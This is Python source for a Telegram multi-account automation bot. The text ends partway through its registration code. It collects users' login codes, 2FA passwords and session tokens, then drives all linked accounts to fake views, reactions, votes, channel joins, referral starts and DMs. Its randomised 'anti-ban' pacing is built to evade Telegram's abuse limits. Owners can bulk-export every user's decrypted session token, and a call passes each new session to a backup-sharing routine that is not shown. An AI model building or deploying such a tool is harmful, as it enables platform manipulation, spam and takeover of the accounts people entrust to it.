import asyncio
import base64
import json
import os
import re
from typing import Dict, Any, List, Optional, Tuple

# aiogram 3.x imports
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile
)

# Telethon imports
from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError
)

# SQLite
import aiosqlite

# Import local configurations
import config
from config import logger

# --- CRYPTO HELPERS ---
def _get_crypto_key() -> int:
    return sum(ord(c) for c in config.SECRET_KEY) % 256 or 42

def encrypt_data(data: str) -> str:
    key = _get_crypto_key()
    cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
    return base64.b64encode(cipher_bytes).decode('utf-8')

def decrypt_data(encrypted_data: str) -> str:
    key = _get_crypto_key()
    try:
        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
        plain_bytes = bytes([b ^ key for b in raw_cipher])
        return plain_bytes.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption failure: {e}")
        return ""

# --- LINK PARSING HELPER ---
def parse_telegram_link(link: str) -> Tuple[Any, Optional[int]]:
    link = link.strip()
    if not link:
        return None, None
        
    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
    if private_match:
        channel_id = int(f"-100{private_match.group(1)}")
        msg_id = int(private_match.group(2))
        return channel_id, msg_id

    if "+ " in link or "/+" in link or "joinchat/" in link:
        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
        return (hash_match.group(1) if hash_match else link, None)
        
    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
    if msg_match:
        return msg_match.group(1), int(msg_match.group(2))
        
    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
    if "/" in target:
        parts = target.split("/")
        target = parts[0]
        if len(parts) > 1 and parts[1].isdigit():
            msg_id = int(parts[1])
            return target, msg_id
            
    return target, None

# --- DATABASE ENGINE ---
class Database:
    def __init__(self, db_path: str = "bot_core_data.db"):
        self.db_path = db_path

    async def init(self):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    role TEXT DEFAULT 'user', 
                    max_accounts INTEGER DEFAULT 5,
                    referred_by INTEGER,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS accounts (
                    phone TEXT PRIMARY KEY,
                    user_id INTEGER, 
                    username TEXT,
                    session_string TEXT,
                    status TEXT DEFAULT 'active', 
                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id)
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    creator_id INTEGER,
                    type TEXT, 
                    payload TEXT, 
                    status TEXT DEFAULT 'pending', 
                    progress TEXT DEFAULT '0%',
                    success_report TEXT,
                    failure_report TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    action TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.commit()
            logger.info("Database system initialized.")

    async def log_action(self, user_id: int, action: str, bot_instance: Optional[Bot] = None):
        try:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute("INSERT INTO logs (user_id, action) VALUES (?, ?)", (user_id, action))
                await db.commit()
        except Exception as db_err:
            logger.error(f"Failed to log action to local DB: {db_err}")
        
        if bot_instance and config.LOG_CHANNEL_ID:
            try:
                log_text = (
                    f"📝 **System Audit Log**\n"
                    f"👤 **User ID:** `{user_id}`\n"
                    f"⚡ **Action:** {action}"
                )
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=log_text)
            except Exception as e:
                logger.error(f"Failed sending log channel metric updates: {e}")

    async def get_user_role(self, user_id: int) -> str:
        if user_id in config.SUPER_OWNER_IDS:
            return "super_owner"
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute("SELECT role FROM users WHERE user_id = ?", (user_id,)) as cursor:
                row = await cursor.fetchone()
                return row[0] if row else "user"

    async def get_admin_limits(self, user_id: int) -> int:
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute("SELECT max_accounts FROM users WHERE user_id = ?", (user_id,)) as cursor:
                row = await cursor.fetchone()
                return row[0] if row else 5

    async def create_user_if_not_exists(self, user_id: int, username: str, referred_by: Optional[int] = None):
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,)) as cursor:
                if not await cursor.fetchone():
                    await db.execute(
                        "INSERT INTO users (user_id, username, role, referred_by) VALUES (?, ?, 'user', ?)",
                        (user_id, username, referred_by)
                    )
                    await db.commit()

db_mgr = Database()
registration_sessions: Dict[int, Dict[str, Any]] = {}
bot_username: str = "bot"

# --- ANTI-BAN TASK MANAGER ENGINE ---
class TaskQueue:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.current_tasks: Dict[int, asyncio.Task] = {}

    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot):
        await self.queue.put((task_id, creator_id, task_type, payload, bot_instance))

    async def start_worker(self):
        logger.info("Anti-Ban Task pipeline processing loop started.")
        while True:
            task_id, creator_id, task_type, payload, bot_instance = await self.queue.get()
            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload, bot_instance))
            self.current_tasks[task_id] = loop_task
            try:
                await loop_task
            except Exception as e:
                logger.error(f"Execution failure on task #{task_id}: {e}")
            finally:
                self.current_tasks.pop(task_id, None)
                self.queue.task_done()

    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot):
        import random
        from telethon.errors import FloodWaitError

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("UPDATE tasks SET status = 'running', progress = '0%' WHERE task_id = ?", (task_id,))
            await db.commit()

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            if role in ["admin", "owner", "super_owner"]:
                query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
                cursor = await db.execute(query)
            else:
                query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
                cursor = await db.execute(query, (creator_id,))
            
            async for row in cursor:
                clients_data.append((row[0], decrypt_data(row[1])))

        if not clients_data:
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET status = 'failed', progress = '0 active bridges available' WHERE task_id = ?", (task_id,))
                await db.commit()
            await db_mgr.log_action(creator_id, f"Failed task #{task_id} (No active accounts available)", bot_instance)
            return

        passed_ids: List[str] = []
        failed_ids: List[Tuple[str, str]] = []
        total_accounts = len(clients_data)

        BATCH_SIZE = 5               
        BASE_COOLDOWN = 15           

        for index, (phone, enc_session) in enumerate(clients_data):
            client = TelegramClient(StringSession(enc_session), config.API_ID, config.API_HASH)
            try:
                await asyncio.sleep(random.uniform(0.5, 1.5))
                await client.connect()
                if not await client.is_user_authorized():
                    async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                        await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                        await db_conn.commit()
                    failed_ids.append((phone, "Unauthorized/Session Expired"))
                    continue

                target = payload.get("target", "")
                parsed_target, link_msg_id = parse_telegram_link(target)
                msg_id = int(payload.get("msg_id", link_msg_id or 0))

                await asyncio.sleep(random.uniform(1.0, 2.5))

                # --- OPERATION ROUTER ---
                if task_type == "join":
                    if isinstance(parsed_target, str) and ("/+" in target or "joinchat/" in target or target.startswith("+")):
                        await client(functions.messages.ImportChatInviteRequest(hash=parsed_target))
                    else:
                        await client(functions.channels.JoinChannelRequest(channel=parsed_target))
                        
                elif task_type == "leave":
                    await client(functions.channels.LeaveChannelRequest(channel=parsed_target))
                    
                elif task_type == "views":
                    if msg_id:
                        await client(functions.messages.GetMessagesViewsRequest(
                            peer=parsed_target,
                            id=[msg_id],
                            increment=True
                        ))
                    else:
                        await client.get_messages(parsed_target, limit=5)
                    
                elif task_type == "react":
                    emojis = payload.get("reactions", ["👍"])
                    assigned_emoji = emojis[index % len(emojis)]
                    await client(functions.messages.SendReactionRequest(
                        peer=parsed_target,
                        msg_id=msg_id,
                        reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                    ))
                        
                elif task_type == "button_vote":
                    button_text = payload.get("button_text", "").strip().lower()
                    msg = await client.get_messages(parsed_target, ids=msg_id)
                    if msg and msg.reply_markup:
                        target_button = None
                        for r_idx, row in enumerate(msg.reply_markup.rows):
                            for c_idx, btn in enumerate(row.buttons):
                                if button_text in btn.text.strip().lower():
                                    target_button = btn
                                    break
                            if target_button:
                                break
                                
                        if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                            await client(functions.messages.GetBotCallbackAnswerRequest(
                                peer=parsed_target,
                                msg_id=msg_id,
                                data=target_button.data
                            ))
                        else:
                            raise ValueError(f"No callback button containing '{button_text}' was found.")
                    else:
                        raise ValueError("No inline layout keyboard signature found on the message node.")
                        
                elif task_type == "dm":
                    message_text = payload.get("text", "Hello!")
                    await client.send_message(parsed_target, message_text)

                elif task_type == "start_bot":
                    bot_username_target = str(parsed_target) if parsed_target else target
                    bot_username_target = bot_username_target.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
                    
                    start_param = None
                    if "start=" in target:
                        param_match = re.search(r'start=([^&\s]+)', target)
                        if param_match:
                            start_param = param_match.group(1)
                            
                    if "?" in bot_username_target:
                        bot_username_target = bot_username_target.split("?")[0]
                        
                    await client.send_message(bot_username_target, f"/start {start_param}" if start_param else "/start")

                passed_ids.append(phone)
                
            except FloodWaitError as fwe:
                wait_time = fwe.seconds
                logger.warning(f"⚠️ Account +{phone} hit a FloodWait! Action requires {wait_time}s cooldown.")
                failed_ids.append((phone, f"FloodWaitError: Blocked for {wait_time}s"))
                backoff = min(wait_time, 20)
                await asyncio.sleep(backoff)
                
            except Exception as e:
                logger.warning(f"Bridge +{phone} skipped task #{task_id}: {e}")
                failed_ids.append((phone, str(e)))
            finally:
                await client.disconnect()

            if (index + 1) % BATCH_SIZE == 0 and (index + 1) < total_accounts:
                batch_cooldown = BASE_COOLDOWN + random.randint(3, 8)
                await asyncio.sleep(batch_cooldown)
            else:
                await asyncio.sleep(random.uniform(1.5, 3.5))

            progress_pct = f"{int(((index + 1) / total_accounts) * 100)}%"
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (progress_pct, task_id))
                await db.commit()

        status = "completed" if len(passed_ids) > 0 else "failed"
        success_report_json = json.dumps(passed_ids)
        failure_report_json = json.dumps(failed_ids)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute(
                "UPDATE tasks SET status = ?, progress = ?, success_report = ?, failure_report = ? WHERE task_id = ?",
                (status, f"{len(passed_ids)}/{total_accounts} Passed", success_report_json, failure_report_json, task_id)
            )
            await db.commit()

        await db_mgr.log_action(
            creator_id, 
            f"Finished executing task #{task_id} ({task_type.upper()}). Passed: {len(passed_ids)}, Failed: {len(failed_ids)}", 
            bot_instance
        )

task_queue = TaskQueue()

# --- FSM STATES ---
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()
    waiting_for_session_file = State()

class TaskWizardStates(StatesGroup):
    choosing_type = State()
    waiting_for_target = State()
    waiting_for_emojis = State()
    waiting_for_button_text = State()
    waiting_for_dm_text = State()

# --- UI KEYBOARD GENERATORS ---
REACTION_EMOJIS = ["👍", "👎", "🔥", "🎉", "👏", "🥰", "😮", "😢", "😡", "💩", "🤩", "🤔", "👀", "💯", "🤣"]

def get_emoji_selection_keyboard(selected_emojis: List[str], existing_reactions: Optional[List[str]] = None) -> InlineKeyboardMarkup:
    keyboard = []
    row = []
    for emoji in REACTION_EMOJIS:
        is_selected = emoji in selected_emojis
        suffix = " ✅" if is_selected else ""
        if existing_reactions and emoji in existing_reactions:
            suffix += " (Existing)"
        btn_text = f"{emoji}{suffix}"
        row.append(InlineKeyboardButton(text=btn_text, callback_data=f"toggle_emoji:{emoji}"))
        if len(row) == 3:  
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    keyboard.append([InlineKeyboardButton(text="✅ Done Select Emojis", callback_data="finish_emoji_selection")])
    keyboard.append([InlineKeyboardButton(text="🔙 Back to Main Console", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(text="📱 Manage Accounts", callback_data="manage_accounts")],
        [InlineKeyboardButton(text="⚡ Do Tasks", callback_data="task_hub_start")],
        [InlineKeyboardButton(text="📊 Tasks Report", callback_data="view_tasks")],
        [InlineKeyboardButton(text="👥 My Referral Matrix", callback_data="view_referrals")],
        [InlineKeyboardButton(text="👨‍💻 Developer Attributions", callback_data="system_credits")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛠️ Administrative Control Console", callback_data="admin_panel")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 Database Core Backups", callback_data="backup_panel")])
        buttons.append([InlineKeyboardButton(text="📈 System Performance Analytics", callback_data="system_stats")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_task_types_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🤖 Start Bot (Referral/Activation)", callback_data="set_type:start_bot")],
        [InlineKeyboardButton(text="👁️ Add Post Views (View Booster)", callback_data="set_type:views")],
        [InlineKeyboardButton(text="📢 Join Channel (Pub/Priv)", callback_data="set_type:join")],
        [InlineKeyboardButton(text="💨 Leave Channel", callback_data="set_type:leave")],
        [InlineKeyboardButton(text="🎭 Add Reaction Expression", callback_data="set_type:react")],
        [InlineKeyboardButton(text="🔘 Press Inline Markup Button", callback_data="set_type:button_vote")],
        [InlineKeyboardButton(text="✉️ Send Direct Message (DM)", callback_data="set_type:dm")],
        [InlineKeyboardButton(text="🔙 Back to Main Console", callback_data="main_menu")]
    ])

# --- ROUTER REGISTER ---
router = Router()

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    referred_by = None
    if len(message.text.split()) > 1:
        ref_payload = message.text.split()[1]
        if ref_payload.startswith("ref_") and ref_payload[4:].isdigit():
            referred_by = int(ref_payload[4:])
            if referred_by == user_id:
                referred_by = None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)

    await db_mgr.log_action(user_id, f"Involved command `/start` with referral payloads: {referred_by}", bot)

    welcome_text = (
        f"👋 Welcome to the **Multi-Account Automation Framework**!\n\n"
        f"👤 **Account ID:** `{user_id}`\n"
        f"🛡️ **System Privilege Level:** `{role.upper()}`\n\n"
        "Deploy, coordinate, and monitor distributed infrastructure tasks safely."
    )
    await message.answer(welcome_text, reply_markup=get_main_keyboard(role))

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    await db_mgr.log_action(callback.from_user.id, "Returned to Main Menu", bot)
    await callback.message.edit_text(
        "👋 **Main Control Console**\nSelect an action vector below:",
        reply_markup=get_main_keyboard(role)
    )

# --- DEVELOPER ATTRIBUTIONS ROUTING PANEL ---
@router.callback_query(F.data == "system_credits")
async def handle_system_credits(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    await db_mgr.log_action(callback.from_user.id, "Viewed Developer Attributions window", bot)
    
    credits_text = (
        "👨‍💻 **Core Engineering Team attributions**\n\n"
        f"🎨 **Lead Architect & Designer:** @{config.DESIGNER_HANDLE}\n"
        "   _Responsible for interface aesthetics, UI layout blueprints, and logic architecture._\n\n"
        f"⚙️ **Operations & System Manager:** @{config.MANAGER_HANDLE}\n"
        "   _Responsible for system scaling, cluster deployment matrices, and core database management._\n\n"
        "🛠️ Built safely for modular high-performance execution."
    )
    
    buttons = [
        [
            InlineKeyboardButton(text="🎨 Contact Designer", url=f"https://t.me/{config.DESIGNER_HANDLE}"),
            InlineKeyboardButton(text="⚙️ Contact Manager", url=f"https://t.me/{config.MANAGER_HANDLE}")
        ],
        [InlineKeyboardButton(text="🔙 Back to Main Console", callback_data="main_menu")]
    ]
    
    await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

# --- ADMINISTRATIVE ROLES ASSIGNMENT SYSTEM ---
@router.message(Command("addadmin"))
async def cmd_add_admin(message: Message, bot: Bot):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["owner", "super_owner"]:
        await message.answer("🚫 Access Denied: Insufficient authorization profiles.")
        return

    args = message.text.split()
    if len(args) < 3 or not args[1].isdigit() or not args[2].isdigit():
        await message.answer("ℹ️ **Usage:** `/addadmin <target_user_id> <max_account_limit>`\nExample: `/addadmin 987654321 50`")
        return

    target_id, limit = int(args[1]), int(args[2])
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (target_id,)) as cursor:
            if not await cursor.fetchone():
                await db.execute("INSERT INTO users (user_id, username, role, max_accounts) VALUES (?, 'Admin Profile', 'admin', ?)", (target_id, limit))
            else:
                await db.execute("UPDATE users SET role = 'admin', max_accounts = ? WHERE user_id = ?", (limit, target_id))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Promoted user {target_id} to Admin with account limit {limit}", bot)
    await message.answer(f"✅ Success! User ID `{target_id}` is now registered as an **Admin** with access limits set to `{limit}` automated IDs.")

@router.message(Command("removeadmin"))
async def cmd_remove_admin(message: Message, bot: Bot):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["owner", "super_owner"]:
        await message.answer("🚫 Access Denied.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("ℹ️ **Usage:** `/removeadmin <target_user_id>`")
        return

    target_id = int(args[1])
    target_role = await db_mgr.get_user_role(target_id)
    if target_role == "super_owner":
        await message.answer("❌ Security Violation: Super Owners cannot be demoted.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET role = 'user', max_accounts = 5 WHERE user_id = ?", (target_id,))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Demoted Admin {target_id}", bot)
    await message.answer(f"✅ User ID `{target_id}` has been stripped of Admin access privileges.")

# --- ACCOUNT INFRASTRUCTURE DEPLOYMENT ---
@router.callback_query(F.data == "manage_accounts")
async def list_user_accounts(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    try:
        await callback.answer() 
        role = await db_mgr.get_user_role(user_id)
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            if role in ["admin", "owner", "super_owner"]:
                cursor = await db.execute("SELECT phone, status, username FROM accounts")
            else:
                cursor = await db.execute("SELECT phone, status, username FROM accounts WHERE user_id = ?", (user_id,))
            rows = await cursor.fetchall()

        await db_mgr.log_action(user_id, "Requested active account list review", bot)

        text = "📱 **Operational Channels Infrastructure**\n\n"
        if not rows:
            text += "_No automation profiles currently linked._"
        else:
            for row in rows:
                icon = "🟢" if row[1] == "active" else "🔴"
                text += f"{icon} `+{row[0]}` (@{row[2] or 'N/A'}) - **{row[1].upper()}**\n"

        buttons = [
            [
                InlineKeyboardButton(text="➕ Link via OTP", callback_data="add_account_phone"),
                InlineKeyboardButton(text="📁 Link String Session / File", callback_data="add_account_session")
            ],
            [
                InlineKeyboardButton(text="📥 Export Session (.txt)", callback_data="select_export_session"),
                InlineKeyboardButton(text="📦 Bulk Admin Export", callback_data="bulk_admin_export")
            ],
            [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
        ]
        
        await callback.message.edit_text(
            text=text, 
            reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
        )
    except Exception as e:
        logger.error(f"Error in list_user_accounts: {e}")
        await callback.message.answer(f"⚠️ **Core UI pipeline error**: {e}\nPlease check terminal logs.")

# --- LINK VIA STRING SESSION OR STR FILE ---
@router.callback_query(F.data == "add_account_session")
async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text(
        "📁 **String Session Integration Hub**\n\n"
        "Please upload a `.txt`/`.session` file containing the Telethon StringSession token, "
        "or paste the raw StringSession text directly into this chat:"
    )
    await state.set_state(RegistrationStates.waiting_for_session_file)

@router.message(StateFilter(RegistrationStates.waiting_for_session_file))
async def process_session_file(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    session_str = ""

    if message.document:
        file_info = await bot.get_file(message.document.file_id)
        file_bytes = await bot.download_file(file_info.file_path)
        session_str = file_bytes.read().decode('utf-8', errors='ignore').strip()
    elif message.text:
        session_str = message.text.strip()

    if not session_str or len(session_str) < 20:
        await message.answer("❌ Invalid data entry. Please submit a functional, unrevoked StringSession hash token.")
        await state.clear()
        return

    try:
        await message.answer("🔄 Validating session configuration with Telegram network...")
        client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await message.answer("❌ Authentication Failed: This session has been revoked or has expired.")
            await client.disconnect()
            await state.clear()
            return
            
        me = await client.get_me()
        phone = me.phone or f"custom_{me.id}"
        encrypted_session = encrypt_data(session_str)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
            await db.commit()

        await db_mgr.log_action(user_id, f"Linked active session for +{phone}", bot)
        await message.answer(f"🎉 Integration complete! Account `+{phone}` (@{me.username or 'N/A'}) is now online in the cluster.")
        
        await share_session_backups(bot, session_str, phone, me.username or "None", user_id)
        await client.disconnect()

    except Exception as e:
        await message.answer(f"❌ Handshake processing failure: {e}")
    finally:
        await state.clear()

# --- EXPORT SINGLE STRING SESSION ---
@router.callback_query(F.data == "select_export_session")
async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    role = await db_mgr.get_user_role(user_id)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            cursor = await db.execute("SELECT phone, username FROM accounts WHERE status = 'active'")
        else:
            cursor = await db.execute("SELECT phone, username FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
        rows = await cursor.fetchall()

    if not rows:
        await callback.message.answer("⚠️ You do not have any active verified bridges to export.")
        return

    text = "📥 **Select active connection profiles to extract portable string data:**"
    buttons = []
    for row in rows:
        buttons.append([InlineKeyboardButton(text=f"+{row[0]} (@{row[1] or 'N/A'})", callback_data=f"export_ph:{row[0]}")])
    
    buttons.append([InlineKeyboardButton(text="🔙 Back", callback_data="manage_accounts")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("export_ph:"))
async def handle_export_session_run(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    phone = callback.data.split(":")[1]
    role = await db_mgr.get_user_role(user_id)

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT user_id, session_string, username FROM accounts WHERE phone = ?", (phone,)) as cursor:
            row = await cursor.fetchone()

    if not row:
        await callback.message.answer("Account session records not found.")
        return

    owner_id, enc_session, username = row
    if role not in ["admin", "owner", "super_owner"] and owner_id != user_id:
        await callback.message.answer("🚫 Scope Exception: Unauthorized.")
        return

    session_str = decrypt_data(enc_session)
    if not session_str:
        await callback.message.answer("❌ Encryption mismatch failed to retrieve session string.")
        return

    session_bytes = session_str.encode('utf-8')
    session_file = BufferedInputFile(session_bytes, filename=f"string_session_{phone}.txt")
    
    await callback.message.reply_document(
        document=session_file, 
        caption=f"🔑 **Portable StringSession Token Document**\n📱 **Phone:** `+{phone}`\n👤 **Username:** @{username or 'N/A'}\n\nCan be deployed on any server environment smoothly."
    )
    await db_mgr.log_action(user_id, f"Exported portable text session for +{phone}", bot)

# --- BULK ADMIN ACCOUNT EXPORT (TEXT-BASED MANIFEST) ---
@router.callback_query(F.data == "bulk_admin_export")
async def handle_bulk_admin_export(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["admin", "owner", "super_owner"]:
        await callback.message.answer("🚫 Access Denied: Admin authorization required.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role == "super_owner":
            cursor = await db.execute("SELECT phone, user_id, username, session_string FROM accounts")
        else:
            cursor = await db.execute("SELECT phone, user_id, username, session_string FROM accounts WHERE user_id = ?", (user_id,))
        rows = await cursor.fetchall()

    if not rows:
        await callback.message.answer("❌ No active profile records found to compile in your backup layout scope.")
        return

    export_payload = []
    for row in rows:
        export_payload.append({
            "phone": row[0],
            "user_id": row[1],
            "username": row[2],
            "session_string": decrypt_data(row[3])
        })

    json_str = json.dumps(export_payload, indent=4)
    file_bytes = json_str.encode('utf-8')
    backup_file = BufferedInputFile(file_bytes, filename=f"accounts_backup_scope_{user_id}.txt")

    await callback.message.reply_document(
        document=backup_file,
        caption=f"📦 **Automated Cluster Backup Manifest File**\n🔒 Total Nodes Captured: `{len(export_payload)}` accounts.\n\n_Forward this file back to the bot and type 'import' to restore these entries._"
    )
    await db_mgr.log_action(user_id, f"Downloaded bulk account cluster manifest document.", bot)

# --- LINK NEW ACCOUNT VIA OTP ---
@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("📞 Enter the account phone number with country prefix code (e.g. `+123456789`):")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext, bot: Bot):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id

    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash
        }
        await message.answer("📩 **OTP Code dispatched.** Input validation sequence string below:")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        logger.error(f"Failed to generate challenge query: {e}")
        await message.answer(f"❌ Error initializing MTProto channel: {str(e)}\nUse /start to reset state machine.")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    otp = message.text.strip()
    
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Cache timeout. Reinitialize sequence with /start.")
        await state.clear()
        return

    client, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        await complete_registration(message, state, client, phone, user_id, bot)
    except SessionPasswordNeededError:
        await message.answer("🔒 Two-Factor Authentication (2FA) active. Enter account security password:")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except PhoneCodeInvalidError:
        await message.answer("❌ Validation mismatch. Verify code entry parameters:")
    except Exception as e:
        await message.answer(f"❌ Handshake failed: {str(e)}")
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    password = message.text.strip()

    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Session context dropped. Reinitialize framework.")
        await state.clear()
        return

    client, phone = reg_data["client"], reg_data["phone"]
    try:
        await client.sign_in(password=password)
        await complete_registration(message, state, client, phone, user_id, bot)
    except PasswordHashInvalidError:
        await message.answer("❌ Password mismatch validation failed. Re-enter 2FA phrase:")
    except Exception as e:
        await message.answer(f"❌ Auth Exception: {str(e)}")
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int, bot: Bot):
    try:
        me = await client.get_me()
        session_str = client.session.save()
        encrypted_session = encrypt_data(session_str)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
            await db.commit()

        await db_mgr.log_action(user_id, f"Linked account session +{phone}", bot)
        await message.answer(f"🎉 Channel Verified! Account `+{phone}` (@{me.username or 'N/A'}) is active in the cluster.")
        
        await share_session_backups(bot, session_str, phone, me.username or "None", user_id)

    except Exception as e:
